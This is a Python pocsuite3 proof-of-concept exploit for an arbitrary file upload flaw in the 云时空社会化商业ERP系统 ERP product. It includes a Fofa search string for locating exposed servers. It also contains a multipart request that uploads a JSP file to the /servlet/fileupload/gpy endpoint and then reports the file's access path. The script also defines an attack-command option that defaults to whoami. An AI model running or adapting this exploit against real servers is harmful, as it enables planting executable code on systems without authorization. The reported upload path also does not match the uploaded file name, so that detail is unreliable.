# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString
from datetime import date

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = "2023"
    createDate = "2024-3-22"
    updateDate = "2024-3-22"
    references =[]
    name ="云时空社会化商业ERP系统gpy任意文件上传"
    appPowerLink = ''
    appName = '时空社会化商业ERP系统'
    appVersion = ''
    vulType = '文件上传'
    desc = '''
    Fofa：app="云时空社会化商业ERP系统"
    '''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/servlet/fileupload/gpy'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388'
                    }
        payload = '--4eea98d02AEa93f60ea08dE3C18A1388\r\nContent-Disposition: form-data; name="file1"; filename="randomtest.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println("test111"); %>\r\n--4eea98d02AEa93f60ea08dE3C18A1388--'
        r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
        today = date.today()
        current_date = today.strftime('%Y-%-m-%-d')
        try:
            if str(current_date) in r.text and 'randomtest.jsp' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url+"\n"+'上传成功，访问地址: '+str(urlresult)+'/uploads/pics/%s/random.jsp' %current_date
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        return self.parse_output(result)
        
register_poc(DemoPOC) 
